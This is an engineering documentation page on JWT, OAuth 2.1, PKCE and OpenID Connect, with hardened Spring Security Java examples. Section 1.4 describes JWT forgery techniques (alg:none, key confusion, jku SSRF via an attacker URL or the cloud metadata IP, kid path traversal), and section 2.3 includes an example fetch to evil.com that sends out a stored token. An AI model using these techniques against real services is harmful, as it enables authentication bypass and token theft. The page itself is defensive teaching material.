---
id: jwt-oauth2-oidc-deep-dive
title: "JWT, OAuth 2.1 & OpenID Connect (OIDC) — Principal Architecture Deep Dive"
sidebar_label: "JWT, OAuth 2.1 & OIDC Deep Dive"
description: "Under-the-hood engineering guide to JOSE (JWS/JWE/JWKS), OAuth 2.0 vs OAuth 2.1, PKCE S256 cryptography, OpenID Connect ID Token mechanics, Phantom Token pattern, DPoP (RFC 9449), Token Exchange (RFC 8693), and Senior/Staff interview playbooks."
tags:
  - security
  - jwt
  - oauth2
  - oauth2.1
  - oidc
  - pkce
  - jwks
  - dpop
  - phantom-token
  - spring-security
---

import JwtOAuthOidcArchitectureDiagram from '@site/src/components/JwtOAuthOidcArchitectureDiagram';
import BffOAuthTokenHandlerDiagram from '@site/src/components/BffOAuthTokenHandlerDiagram';
import OAuthPkceFlowDiagram from '@site/src/components/OAuthPkceFlowDiagram';
import OidcFlowDiagram from '@site/src/components/OidcFlowDiagram';

# JWT, OAuth 2.1 & OpenID Connect (OIDC) — Principal Architecture Deep Dive

Modern distributed identity is built on three distinct yet frequently conflated standards:
1. **JWT (JSON Web Token — RFC 7519) & JOSE Suite**: A cryptographic **data container format** for representing signed (`JWS`) or encrypted (`JWE`) claims between parties.
2. **OAuth 2.0 (RFC 6749) & OAuth 2.1**: A **delegated authorization framework** governing how clients obtain scoped `access_token` credentials to call resource APIs.
3. **OpenID Connect (OIDC 1.0)**: A **federated authentication & identity layer** built on top of OAuth 2.0 that issues a signed `id_token` (asserting *who* the authenticated user is) and standardizes discovery (`/.well-known/openid-configuration`).

---

## 1. JOSE & JWT Cryptographic Internals (JWS, JWE, JWK, JWKS)

A "JWT" on the wire is almost always a **JWS (JSON Web Signature, RFC 7515)** or, less commonly, a **JWE (JSON Web Encryption, RFC 7516)** serialized in Compact Format.

<JwtOAuthOidcArchitectureDiagram initialMode="jwt-attacks" />

### 1.1 JWS (Signed) vs. JWE (Encrypted) Wire Format

| Specification | Structure | Wire Segments | Cryptographic Purpose | When to Use |
| :--- | :--- | :--- | :--- | :--- |
| **JWS (RFC 7515)** | `Header.Payload.Signature` | **3 parts** (`eyJ... . eyJ... . sig`) | **Integrity & Authenticity** (Base64Url-encoded plaintext payload; anyone can read, only private key holder can sign) | 99% of microservice Access Tokens (`at+jwt`) and OIDC `id_token`s |
| **JWE (RFC 7516)** | `Header.EncryptedKey.IV.Ciphertext.AuthTag` | **5 parts** | **Confidentiality + Integrity (AEAD)** (Payload is encrypted via AES-GCM; opaque to intermediaries) | Passing sensitive PII/financial claims across untrusted clients without a BFF |
| **Nested JWT (`JWS` inside `JWE`)** | Sign first (`JWS`), then encrypt (`JWE`) with header `"cty": "JWT"` | **5 parts** | **Non-repudiation + Confidentiality** (Why sign-then-encrypt? Encrypting first allows an attacker to strip the outer signature and re-sign your ciphertext as their own!) | High-assurance Open Banking (FAPI 2.0) and healthcare federations |

### 1.2 Signing Algorithm Trade-Offs (`HS256` vs `RS256` vs `ES256` vs `EdDSA`)

The JWS signature covers the exact ASCII bytes of `Base64Url(Header) + "." + Base64Url(Payload)`:

$$\text{Signature} = \text{Sign}_{K_{\text{priv}}}\left(\text{ASCII}(\text{Base64Url}(H) \mathbin{\Vert} \text{"."} \mathbin{\Vert} \text{Base64Url}(P))\right)$$

| Algorithm (`alg`) | Cryptographic Primitive | Key Size | Signature Size | Sign / Verify CPU Cost | Principal Architecture Verdict |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **`HS256`** | Symmetric HMAC-SHA256 | $\ge 256\text{ bits}$ | $32\text{ B}$ ($43\text{ chars}$) | Ultra-Fast ($\sim 1\ \mu\text{s}$) | ❌ **Dangerous in Microservices**: Every verifier shares the signing secret. One breached service can forge admin tokens for the entire cluster. |
| **`RS256`** | Asymmetric RSASSA-PKCS1-v1_5 + SHA-256 | $2048\text{–}4096\text{ bits}$ | $256\text{ B}$ ($342\text{ chars}$) | Signing slow ($\sim 1\text{ ms}$); Verify fast ($\sim 30\ \mu\text{s}$) | ✅ **Enterprise Default**: Universal compatibility across legacy and modern gateways. Private key stays locked in IdP/HSM; verifiers only fetch public JWKS. |
| **`PS256`** | Asymmetric RSASSA-PSS + SHA-256 | $2048\text{ bits}$ | $256\text{ B}$ ($342\text{ chars}$) | Similar to `RS256` | ✅ **FAPI / Banking Standard**: Probabilistic padding eliminates deterministic PKCS#1 v1.5 mathematical weaknesses. |
| **`ES256`** | Asymmetric ECDSA (P-256 / `secp256r1`) + SHA-256 | $256\text{ bits}$ | **$64\text{ B}$ ($86\text{ chars}$)** | Signing $10\times$ faster than RSA; Verify $\sim 70\ \mu\text{s}$ | 🌟 **Cloud-Native Best Practice**: Shrinks HTTP `Authorization` header size by **256 bytes per request** compared to `RS256`. |
| **`EdDSA`** | Edwards-curve (`Ed25519`) | $256\text{ bits}$ | **$64\text{ B}$ ($86\text{ chars}$)** | Fast Sign & Verify, deterministic nonce | 🌟 **Modern Zero-Trust Ideal**: Immune to ECDSA biased-randomness (`k` nonce reuse) private-key recovery attacks. |

> [!CAUTION]
> **The ECDSA Nonce Reuse Catastrophe (`ES256`):** In ECDSA, signing requires a cryptographically random per-signature ephemeral number $k$. If a faulty PRNG ever produces the same $k$ for two different tokens, anyone with the two public signatures can algebraically solve for the IdP's private key in milliseconds. Always use deterministic ECDSA (RFC 6979) or `Ed25519` (`EdDSA`).

---

### 1.3 JWKS Key Rotation & The "Unknown `kid`" DDoS Trap

In production, an Identity Provider exposes its public verification keys at a **JWKS (JSON Web Key Set, RFC 7517)** endpoint (e.g., `https://auth.example.com/.well-known/jwks.json`):

```json
{
  "keys": [
    {
      "kty": "EC",
      "crv": "P-256",
      "use": "sig",
      "alg": "ES256",
      "kid": "key-2026-10-active",
      "x": "f83OJ3D2xF1Bg8vub9tLe1gHMzV76e8Tus9uPHvRVEU",
      "y": "x_FEzRu9m36HLN_tue659LNpXW6pCyStikYjKIWI5a0"
    },
    {
      "kty": "EC",
      "crv": "P-256",
      "use": "sig",
      "alg": "ES256",
      "kid": "key-2026-09-retiring",
      "x": "1Hr3...",
      "y": "9Kp2..."
    }
  ]
}
```

#### Zero-Downtime Key Rotation Lifecycle (3-Phase Rollover):
If the IdP immediately generates a new key `kid="key-new"` and starts signing tokens with it, downstream microservices whose local JWKS cache has not refreshed will reject valid user tokens with `401 Unauthorized`!
1. **Phase 1 — Pre-Publish (Passive Warmup)**: Add `key-new` to the `/.well-known/jwks.json` response *without* signing tokens with it yet. Wait for at least $2 \times \text{JWKS\_CACHE\_TTL}$ (e.g., if microservice cache TTL is 15 minutes, wait 30 minutes) so every microservice pod caches `key-new`.
2. **Phase 2 — Active Signing Flip**: Switch the IdP signer to sign all newly minted JWTs with `kid="key-new"`. Keep `key-old` in `jwks.json` so in-flight tokens signed seconds before the flip remain verifiable until their `exp` (e.g., 15 minutes).
3. **Phase 3 — Decommission**: Once $\text{Now} > \text{FlipTime} + \text{MaxTokenTTL} + \text{ClockSkew}$, remove `key-old` from `jwks.json`.

#### The "Unknown `kid`" Cache-Bypass DDoS Vector:
When a microservice encounters a JWT with a `kid` not in its local memory cache, libraries like Nimbus `RemoteJWKSet` automatically trigger a synchronous HTTP GET to the IdP's `/jwks.json` endpoint in case keys just rotated.
- **The Attack**: An attacker sends 50,000 requests/sec with forged JWT headers containing random `kid: "uuid-1"`, `kid: "uuid-2"`. Every request bypasses the local JWKS cache and hammers the IdP's `/jwks.json` endpoint, causing thread-pool exhaustion across all microservices and taking down the Identity Provider!
- **The Principal Fix**: Enforce **rate-limited negative caching / cooldowns** on JWKS refreshes (e.g., Nimbus `DefaultJWKSetCache` with `refreshTime` cooldown of 60 seconds, single-flight request coalescing, and circuit breaking).

---

### 1.4 Cryptographic & Header Injection Attacks on JWT

1. **The `alg: none` Signature Bypass**:
   - **Mechanism**: The JWA specification (RFC 7518) included `"alg": "none"` for "Unsecured JWS" (when integrity is already guaranteed by another layer). Attackers decode a JWT, change `"sub": "admin"`, set `"alg": "none"`, and strip the signature (`header.payload.`).
   - **Defense**: Use `parseSignedClaims()` (JJWT) or `SignedJWT` with an explicit algorithm allowlist (`JWSAlgorithm.ES256`, `JWSAlgorithm.RS256`).
2. **The `RS256` $\to$ `HS256` Key Confusion Attack**:
   - **Mechanism**: The server normally signs with an RSA private key (`RS256`) and verifies with an RSA public key (`RSAPublicKey`). Because the RSA public key is public (available at `/jwks.json`), an attacker downloads the exact PEM string of the public key, changes the JWT header to `"alg": "HS256"`, and computes an `HMAC-SHA256` signature using the **public key bytes as the symmetric HMAC secret**. Broken verification code that inspects `header.alg` and passes `publicKeyBytes` into `verify(token, keyBytes)` executes `HMAC(publicKeyBytes)` and accepts the forged token!
   - **Defense**: Pin the expected `JWSAlgorithm` on the verifier and bind keys strictly by Java type (`RSAPublicKey` / `ECPublicKey` cannot be passed to `MACVerifier`).
3. **`jku` / `x5u` SSRF & Embedded `jwk` Self-Signing**:
   - **Mechanism**: RFC 7515 defines optional headers: `jku` (JWK Set URL), `x5u` (X.509 URL), and `jwk` (Embedded Public Key). Attackers sign a token with their own private key and either embed the matching public key inside `header.jwk` or point `header.jku` to `https://attacker.com/jwks.json` (or an internal AWS metadata IP `http://169.254.169.254/...` for SSRF).
   - **Defense**: **Never** resolve verification keys from URLs or keys inside the unverified JWT header. Only resolve keys from a statically configured/discovered IdP `jwks_uri`.
4. **`kid` Path Traversal & SQL Injection**:
   - **Mechanism**: Since `kid` is read *before* signature verification, if a custom verifier loads keys from disk (`new File("/keys/" + header.getKeyId())`), an attacker sets `"kid": "../../../../dev/null"`. Since `/dev/null` returns `0` bytes (`""`), the attacker signs an `HS256` token using an empty string secret `""` and bypasses authentication.
   - **Defense**: Validate `kid` against `^[a-zA-Z0-9_-]{1,64}$` before looking it up in an in-memory `Map<String, JWK>`.

---

## 2. OAuth 2.0 & OAuth 2.1 Architecture Deep Dive

OAuth 2.0 (RFC 6749) was published in 2012. Over the next decade, several original grant types proved catastrophically insecure in modern web/mobile environments. **OAuth 2.1** consolidates RFC 6749 with security extensions (RFC 7636 PKCE, RFC 8252 Native Apps, RFC 9700 Security Best Current Practice).

<JwtOAuthOidcArchitectureDiagram initialMode="oauth-oidc" />

### 2.1 OAuth 2.0 vs. OAuth 2.1: What Changed and Why?

| Feature / Grant Type | OAuth 2.0 (RFC 6749) | OAuth 2.1 Consolidated Spec | Architectural Rationale |
| :--- | :--- | :--- | :--- |
| **Authorization Code Flow + PKCE** | Optional extension (RFC 7636) for mobile apps | **Mandatory (`S256`) for ALL clients** (Public SPAs, Mobile, AND Confidential Backend Servers) | Protects against authorization code interception AND authorization code injection attacks on confidential servers. |
| **Implicit Grant (`response_type=token`)** | Standard flow for SPAs | ❌ **Completely Removed** | Returning `access_token` in the URL fragment (`#access_token=...`) leaks tokens via browser history, `Referer` headers, DOM XSS scripts, and has no Refresh Token support. |
| **Resource Owner Password Credentials (`grant_type=password`)** | Allowed for "trusted" first-party apps | ❌ **Completely Removed** | Exposes raw user passwords to the client app, breaks Federated SSO, and makes MFA/Passkeys/WebAuthn impossible to enforce cleanly. |
| **`redirect_uri` Validation** | Prefix or wildcard matching often permitted | **Exact byte-for-byte string matching required** | Wildcard `redirect_uri` (`https://*.example.com/*`) enables open-redirect token theft via subdomain takeover or open redirectors. |
| **Bearer Token in URL Query (`?access_token=...`)** | Permitted by RFC 6750 Section 2.3 | ❌ **Forbidden** | Query parameters are logged in plaintext across CDNs, reverse proxies, load balancers, and APM traces. Only `Authorization` header is permitted. |
| **Refresh Tokens for Public Clients** | Unspecified | **Must be Sender-Constrained (DPoP/mTLS) OR Rotation-Enabled (RTR)** | Prevents silent long-term account hijacking when a public client's storage is compromised. |

---

### 2.2 Under the Hood of PKCE (RFC 7636) — Why `state` Is Not Enough

A classic senior interview question is: *"Why do we need both `state` and `PKCE` (`code_challenge`)? Aren't they both random strings?"*

<OAuthPkceFlowDiagram />

#### The Mathematical & Protocol Distinction:
1. **`state` (Cross-Site Request Forgery / Login CSRF Protection)**:
   - Generated by the Client, stored in the user's local browser session/cookie, sent on `/authorize`, and echoed back verbatim by the IdP on the `/callback?code=...&state=...` redirect.
   - **What it stops**: Attacker initiates a login flow with the attacker's own account, intercepts their own `code_attacker`, and tricks a victim's browser into visiting `https://app.com/callback?code=code_attacker` (Login CSRF — linking the victim's session to the attacker's account). Because `state` doesn't match the victim's browser session, the callback is rejected.
   - **Why `state` fails against Code Interception**: `state` travels in plaintext in the initial front-channel `/authorize` URL AND the `/callback` URL. Anything that intercepts the front-channel redirect (compromised mobile custom URI scheme `myapp://callback`, malicious browser extension, proxy log) sees both `code` and `state`!
2. **`PKCE` (Proof Key for Code Exchange — Cryptographic Code Binding)**:
   - **Step 1**: Client generates a high-entropy cryptographic secret `code_verifier` (43 to 128 URL-safe characters, $\ge 256\text{ bits}$ of entropy).
   - **Step 2**: Client computes the one-way SHA-256 hash:
     $$\text{code\_challenge} = \text{Base64UrlNoPad}(\text{SHA-256}(\text{ASCII}(\text{code\_verifier})))$$
   - **Step 3**: Client sends **only** `code_challenge` and `code_challenge_method=S256` on the front-channel `/authorize` redirect. The IdP stores $(\text{code\_challenge}, \text{method})$ inside the issued authorization code state.
   - **Step 4**: When exchanging the `code` via the back-channel `POST /token`, the Client sends the raw `code_verifier`. The IdP computes $\text{Base64UrlNoPad}(\text{SHA-256}(\text{code\_verifier}))$ and compares it in constant time with the stored `code_challenge`.
   - **Why `plain` method must be banned**: PKCE defines `plain` (`code_challenge == code_verifier`) only for legacy constrained devices. In production, always force `code_challenge_method=S256`; otherwise an eavesdropper on `/authorize` already has the verifier.

---

### 2.3 BFF (Backend-For-Frontend) Token Handler Pattern for SPAs

Storing raw JWT `access_token` or `refresh_token` in browser `localStorage` or `sessionStorage` leaves applications completely exposed to **Cross-Site Scripting (XSS)** (a single compromised npm dependency or injected script can execute `fetch('https://evil.com', { body: localStorage.getItem('token') })`).

<BffOAuthTokenHandlerDiagram />

In the **BFF Token Handler Architecture** (recommended by the IETF OAuth Working Group `draft-ietf-oauth-browser-based-apps`):
1. The React/Next.js/Angular SPA **never** touches `access_token`, `refresh_token`, or `id_token`.
2. A lightweight edge **BFF proxy** (e.g., Spring Cloud Gateway with `oauth2Login()` + `TokenRelay=` filter, or Duende/Kong BFF) acts as a **Confidential OAuth Client**.
3. The BFF performs the Authorization Code + PKCE exchange using its confidential `client_secret` / `private_key_jwt`, stores the OAuth tokens in an encrypted server-side Redis session (or encrypted cookie chunk), and issues an `HttpOnly; Secure; SameSite=Strict; Path=/api` session cookie (`__Host-session`) to the browser.
4. Notice the **`__Host-` Cookie Prefix**: Setting the cookie name to `__Host-session` forces the browser to enforce that the cookie has `Secure=true`, `Path=/`, and **no `Domain` attribute**, preventing a compromised sibling subdomain (`blog.example.com`) from overwriting or tossing cookies onto `app.example.com` (**Cookie Tossing Attack**)!

---

## 3. OpenID Connect (OIDC) Internals & Identity Federation

OAuth 2.0 intentionally omitted user identity: an OAuth 2.0 `access_token` is opaque to the Client (it is meant for the Resource Server, not the Client). Early developers abused OAuth 2.0 for login by calling a proprietary `/me` API with the access token, which led to severe **Token Substitution / Confused Deputy** vulnerabilities. **OpenID Connect (OIDC)** solved this by introducing the **`id_token`**.

<OidcFlowDiagram />

### 3.1 `id_token` vs. `access_token` — The Iron Law of Separation

| Dimension | OIDC `id_token` | OAuth 2.0 / 2.1 `access_token` (RFC 9068 `at+jwt`) |
| :--- | :--- | :--- |
| **Primary Purpose** | **Authentication Proof**: Tells the **Client App** *"Who just logged in, when, and how"* (`amr`, `acr`, `auth_time`) | **Authorization Credential**: Tells the **Resource Server (API)** *"What scopes/permissions this caller is granted"* |
| **Intended Audience (`aud`)** | **The `client_id`** of the Relying Party (e.g., `"aud": "web-spa-client"`) | **The URI of the target Resource Server** (e.g., `"aud": "https://api.payments.internal"`) |
| **JOSE Header `typ`** | `"typ": "JWT"` | **`"typ": "at+jwt"`** (RFC 9068 explicit typing prevents cross-token confusion) |
| **Who Validates It?** | **The Client App / BFF** upon receiving it from `/token` | **The Resource Server / API Gateway** on every incoming API call |
| **Should It Be Sent in `Authorization: Bearer` to Backend APIs?** | ❌ **NEVER!** Sending `id_token` as an API Bearer token violates OIDC spec and allows any third-party app where the user logged in to impersonate the user on your API! | ✅ **YES** |

### 3.2 Critical OIDC Claims: `nonce`, `at_hash`, `azp`, `acr`, `amr`

```json
{
  "iss": "https://idp.example.com",
  "sub": "usr_9f8a7b6c5d4e",
  "aud": "checkout-web-client",
  "azp": "checkout-web-client",
  "exp": 1760602200,
  "iat": 1760601900,
  "auth_time": 1760601895,
  "nonce": "n-0S6_WzA2Mj",
  "at_hash": "77QmUPtjPfzWtF2AnpK9RQ",
  "acr": "urn:mace:incommon:iap:silver",
  "amr": ["pwd", "hwk", "mfa"],
  "sid": "sess_8812_global"
}
```

- **`nonce` (Number Used Once)**: Generated by the client before `/authorize`, stored in an `HttpOnly` cookie bound to the browser, passed to `/authorize`, and embedded inside the signed `id_token`. The client **must** verify that `id_token.nonce == cookie.nonce` to prevent **ID Token Replay & Mix-Up Attacks**.
- **`at_hash` (Access Token Hash)**: The left-most 128 bits of the SHA-256 hash of the ASCII `access_token`, Base64Url-encoded. Cryptographically binds the `id_token` to the `access_token` so an attacker cannot swap a legitimate `id_token` with a different `access_token`.
- **`acr` (Authentication Context Class Reference) & `amr` (Authentication Methods References)**: Allows Resource Servers to enforce **Step-Up Authentication** (e.g., `/api/wire-transfer` requires `amr` to contain `"mfa"` or `"hwk"` hardware key and `auth_time` within the last 5 minutes; otherwise returns `401 WWW-Authenticate: Bearer error="insufficient_user_authentication", max_age=300`).
- **`sid` (Session ID)**: Identifies the user's SSO session at the IdP for **OIDC Back-Channel Logout**.

### 3.3 OIDC Single Logout: Front-Channel vs. Back-Channel Logout

When an enterprise user logs out of Okta/Keycloak or clicks "Sign Out" in App A, how do App B and App C terminate their local sessions?
1. **Front-Channel Logout**: The IdP renders an HTML page containing hidden `<iframe src="https://app-b.com/oidc/logout?iss=...&sid=...">` tags. The user's browser sends App B's cookies to clear the session.
   - *Production Flaw*: Modern browsers (Safari ITP, Firefox ETP, Brave, Chrome third-party cookie restrictions) block third-party cookies inside cross-origin `<iframe>` elements, causing Front-Channel Logout to silently fail!
2. **Back-Channel Logout (OpenID Connect Back-Channel Logout 1.0)**:
   - The IdP makes a direct server-to-server `POST https://app-b.com/backchannel-logout` request carrying a signed **`logout_token` JWT**.
   - The `logout_token` contains `"events": { "http://schemas.openid.net/event/backchannel-logout": {} }`, the `sub` or `sid` claim, and **explicitly omits the `nonce` claim** (and sets `"typ": "logout+jwt"`) so a `logout_token` can never be replayed as an `id_token`.
   - App B validates the `logout_token` signature and immediately evicts `sid` from its Redis session store.

---

## 4. Enterprise Microservices Token Patterns

### 4.1 The Phantom Token Pattern (Edge Opaque $\to$ Internal JWT)

How do you prevent external clients from inspecting internal authorization claims (`tenant_tier`, `internal_roles`, `org_uuid`) while still keeping internal microservices 100% stateless?

<JwtOAuthOidcArchitectureDiagram initialMode="phantom-token" />

1. **External Issuance**: The Authorization Server issues a high-entropy **Opaque Reference Token** (e.g., `8f9d2a1b-4c3e-...`) to the mobile or web client.
2. **API Gateway Introspection & Translation**: When a request arrives at the Edge API Gateway (Envoy / Kong / Spring Cloud Gateway), the Gateway calls the IdP's **Token Introspection Endpoint (RFC 7662)** (`POST /oauth/introspect` with `Accept: application/jwt`) or looks up the opaque token in a shared Edge Redis cache.
3. **Downstream JWS Propagation**: The Gateway replaces `Authorization: Bearer <opaque>` with `Authorization: Bearer <signed_JWS>` before forwarding the request inside the private VPC/Service Mesh. Downstream microservices verify the JWS signature locally with zero external network calls.

---

### 4.2 OAuth 2.0 Token Exchange (RFC 8693) — Preventing Confused Deputies in Deep Call Graphs

Suppose a user calls `OrderService` with an Access Token, and `OrderService` needs to call `ShippingService` and `FraudService`.
- **The Anti-Pattern (Blind Token Forwarding)**: `OrderService` simply forwards the user's incoming JWT to `ShippingService`, and both services accept `"aud": "internal-apis"`. If a low-security service (`NotificationService`) is compromised by an attacker, the attacker can take any incoming user's JWT and replay it directly against `PaymentService`!
- **The Principal Pattern (RFC 8693 Token Exchange)**:
  - `OrderService` sends the incoming `subject_token` to the Auth Server with `grant_type=urn:ietf:params:oauth:grant-type:token-exchange`, requesting `audience=https://shipping.internal` and reduced scopes (`shipping:estimate`).
  - The Auth Server returns a down-scoped JWT with `"aud": "https://shipping.internal"` and an **`act` (Actor) claim** recording the delegation chain:
    ```json
    {
      "sub": "usr_9f8a7b6c5d4e",
      "aud": "https://shipping.internal",
      "scope": "shipping:estimate",
      "act": {
        "sub": "spiffe://prod.internal/ns/core/sa/order-service"
      }
    }
    ```
  - `ShippingService` verifies both *who the end-user is* (`sub`) and *which microservice is acting on their behalf* (`act.sub`), creating a tamper-proof zero-trust audit trail.

---

### 4.3 Sender-Constrained Tokens: DPoP (RFC 9449) & mTLS (RFC 8705)

<JwtOAuthOidcArchitectureDiagram initialMode="dpop-mtls" />

| Attribute | Bearer Token (RFC 6750) | DPoP (RFC 9449 — Application Layer) | mTLS Bound Token (RFC 8705 — Transport Layer) |
| :--- | :--- | :--- | :--- |
| **Theft Resilience** | ❌ **Zero** (Replayable from any machine until `exp`) | ✅ **High** (Requires private key in WebCrypto / Secure Enclave) | ✅ **Highest** (Bound to client X.509 certificate in TLS handshake) |
| **Confirmation Claim (`cnf`)** | None | `"cnf": { "jkt": "<SHA-256 JWK Thumbprint>" }` | `"cnf": { "x5t#S256": "<SHA-256 Cert Thumbprint>" }` |
| **Browser / SPA Support** | Native | ✅ Supported via WebCrypto API (`extractable: false` `CryptoKey`) | ❌ Poor (Browser client cert UX prompts are unusable for consumers) |
| **Reverse Proxy / CDN Impact** | Transparent | ✅ Transparent (Travels in standard HTTP `DPoP` header) | ⚠️ Requires TLS termination passthrough or proxy cert header forwarding |
| **Primary Use Case** | General internal APIs with short TTLs | SPAs, Mobile Apps, Public Clients | Service-to-Service M2M, Open Banking (FAPI), SPIFFE/SPIRE |

---

## 5. Production Implementation (Java 21 & Spring Security 6.x)

### 5.1 Hardened Spring Security 6 OAuth2 Resource Server (Algorithm Pinning + RFC 9068 `at+jwt` + `aud` Validation)

Default JWT configurations often validate only `iss` and `exp`. In production, you must explicitly pin the asymmetric algorithm, validate `typ="at+jwt"` (to block OIDC `id_token` replay), and enforce strict `aud` (Audience) matching:

```java
package com.example.security.config;

import com.nimbusds.jose.JOSEObjectType;
import com.nimbusds.jose.JWSAlgorithm;
import com.nimbusds.jose.proc.DefaultJOSEObjectTypeVerifier;
import com.nimbusds.jose.proc.JWSVerificationKeySelector;
import com.nimbusds.jose.proc.SecurityContext;
import com.nimbusds.jose.jwk.source.JWKSource;
import com.nimbusds.jose.jwk.source.JWKSourceBuilder;
import com.nimbusds.jwt.proc.ConfigurableJWTProcessor;
import com.nimbusds.jwt.proc.DefaultJWTProcessor;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.method.configuration.EnableMethodSecurity;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configurers.AbstractHttpConfigurer;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.oauth2.core.DelegatingOAuth2TokenValidator;
import org.springframework.security.oauth2.core.OAuth2Error;
import org.springframework.security.oauth2.core.OAuth2TokenValidator;
import org.springframework.security.oauth2.core.OAuth2TokenValidatorResult;
import org.springframework.security.oauth2.jwt.Jwt;
import org.springframework.security.oauth2.jwt.JwtClaimValidator;
import org.springframework.security.oauth2.jwt.JwtDecoder;
import org.springframework.security.oauth2.jwt.JwtTimestampValidator;
import org.springframework.security.oauth2.jwt.JwtValidators;
import org.springframework.security.oauth2.jwt.NimbusJwtDecoder;
import org.springframework.security.web.SecurityFilterChain;

import java.net.URI;
import java.time.Duration;
import java.util.List;
import java.util.Set;

@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class HardenedResourceServerConfig {

    @Value("${security.oauth2.issuer-uri:https://auth.example.com}")
    private String issuerUri;

    @Value("${security.oauth2.jwks-uri:https://auth.example.com/.well-known/jwks.json}")
    private String jwksUri;

    @Value("${security.oauth2.expected-audience:https://api.payments.example.com}")
    private String expectedAudience;

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http, JwtDecoder hardenedJwtDecoder)
            throws Exception {
        return http
            .csrf(AbstractHttpConfigurer::disable)
            .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/actuator/health", "/actuator/prometheus").permitAll()
                .anyRequest().authenticated()
            )
            .oauth2ResourceServer(oauth2 -> oauth2
                .jwt(jwt -> jwt.decoder(hardenedJwtDecoder))
            )
            .build();
    }

    @Bean
    public JwtDecoder hardenedJwtDecoder() throws Exception {
        // 1. Build resilient JWKSource with TTL caching, refresh cooldown (prevents kid DDoS),
        //    and outage tolerance (serves stale keys if IdP is temporarily unreachable)
        JWKSource<SecurityContext> jwkSource = JWKSourceBuilder
            .create(URI.create(jwksUri).toURL())
            .cache(Duration.ofHours(2).toMillis(), Duration.ofMinutes(1).toMillis()) // 2h TTL, 1m refresh cooldown
            .rateLimited(Duration.ofSeconds(30).toMillis()) // Anti-stampede rate limit on unknown kid
            .outageTolerant(Duration.ofHours(4).toMillis()) // Survive IdP control-plane outage
            .build();

        ConfigurableJWTProcessor<SecurityContext> jwtProcessor = new DefaultJWTProcessor<>();

        // 2. Enforce RFC 9068 explicit typing: only accept Access Tokens (at+jwt or JWT), NEVER id_token/logout+jwt
        jwtProcessor.setJWSTypeVerifier(new DefaultJOSEObjectTypeVerifier<>(
            new JOSEObjectType("at+jwt"),
            JOSEObjectType.JWT
        ));

        // 3. Pin asymmetric algorithms explicitly (prevents alg:none and RS256->HS256 key confusion)
        jwtProcessor.setJWSKeySelector(new JWSVerificationKeySelector<>(
            Set.of(JWSAlgorithm.ES256, JWSAlgorithm.RS256),
            jwkSource
        ));

        NimbusJwtDecoder decoder = new NimbusJwtDecoder(jwtProcessor);

        // 4. Validate Issuer, Timestamp (with 30s clock skew), and strict Audience (prevents confused deputy)
        OAuth2TokenValidator<Jwt> issuerValidator = JwtValidators.createDefaultWithIssuer(issuerUri);
        OAuth2TokenValidator<Jwt> timestampValidator = new JwtTimestampValidator(Duration.ofSeconds(30));
        OAuth2TokenValidator<Jwt> audienceValidator = new JwtClaimValidator<List<String>>(
            "aud",
            audList -> audList != null && audList.contains(expectedAudience)
        );
        OAuth2TokenValidator<Jwt> blockIdTokenValidator = token -> {
            // Defense-in-depth: reject any token carrying OIDC id_token-specific nonce or at_hash claims
            if (token.hasClaim("nonce") || token.hasClaim("at_hash")) {
                return OAuth2TokenValidatorResult.failure(
                    new OAuth2Error("invalid_token", "OIDC ID Token cannot be used as an API Access Token", null)
                );
            }
            return OAuth2TokenValidatorResult.success();
        };

        decoder.setJwtValidator(new DelegatingOAuth2TokenValidator<>(
            issuerValidator,
            timestampValidator,
            audienceValidator,
            blockIdTokenValidator
        ));

        return decoder;
    }
}
```

### 5.2 Cryptographic PKCE (`S256`) & OIDC `at_hash` Computation in Java 21

```java
package com.example.security.crypto;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Arrays;
import java.util.Base64;

public final class OidcPkceCryptoUtils {

    private static final SecureRandom SECURE_RANDOM = new SecureRandom();
    private static final Base64.Encoder BASE64_URL_NOPAD = Base64.getUrlEncoder().withoutPadding();

    private OidcPkceCryptoUtils() {}

    /**
     * Generates a RFC 7636 compliant 256-bit high-entropy code_verifier (43 Base64Url characters).
     */
    public static String generateCodeVerifier() {
        byte[] randomBytes = new byte[32]; // 256 bits of entropy
        SECURE_RANDOM.nextBytes(randomBytes);
        return BASE64_URL_NOPAD.encodeToString(randomBytes);
    }

    /**
     * Computes RFC 7636 S256 code_challenge = Base64UrlWithoutPadding(SHA-256(ASCII(code_verifier))).
     */
    public static String computeS256CodeChallenge(String codeVerifier) {
        try {
            MessageDigest sha256 = MessageDigest.getInstance("SHA-256");
            byte[] digest = sha256.digest(codeVerifier.getBytes(StandardCharsets.US_ASCII));
            return BASE64_URL_NOPAD.encodeToString(digest);
        } catch (NoSuchAlgorithmException e) {
            throw new IllegalStateException("SHA-256 unavailable in JVM", e);
        }
    }

    /**
     * Constant-time verification of PKCE code_verifier against stored code_challenge.
     */
    public static boolean verifyPkceS256(String receivedVerifier, String storedChallenge) {
        String computed = computeS256CodeChallenge(receivedVerifier);
        return MessageDigest.isEqual(
            computed.getBytes(StandardCharsets.US_ASCII),
            storedChallenge.getBytes(StandardCharsets.US_ASCII)
        );
    }

    /**
     * Computes OIDC Core 1.0 Section 3.1.3.6 at_hash claim:
     * Left-most 128 bits (16 bytes) of SHA-256(ASCII(access_token)), Base64Url-encoded without padding.
     */
    public static String computeAtHash(String accessToken) {
        try {
            MessageDigest sha256 = MessageDigest.getInstance("SHA-256");
            byte[] fullHash = sha256.digest(accessToken.getBytes(StandardCharsets.US_ASCII));
            byte[] leftHalf = Arrays.copyOfRange(fullHash, 0, fullHash.length / 2); // 16 bytes (128 bits)
            return BASE64_URL_NOPAD.encodeToString(leftHalf);
        } catch (NoSuchAlgorithmException e) {
            throw new IllegalStateException("SHA-256 unavailable in JVM", e);
        }
    }
}
```

---

## 🧠 Senior/Staff Interview Playbook: How to Ace JWT, OAuth 2.0 & OIDC Interviews

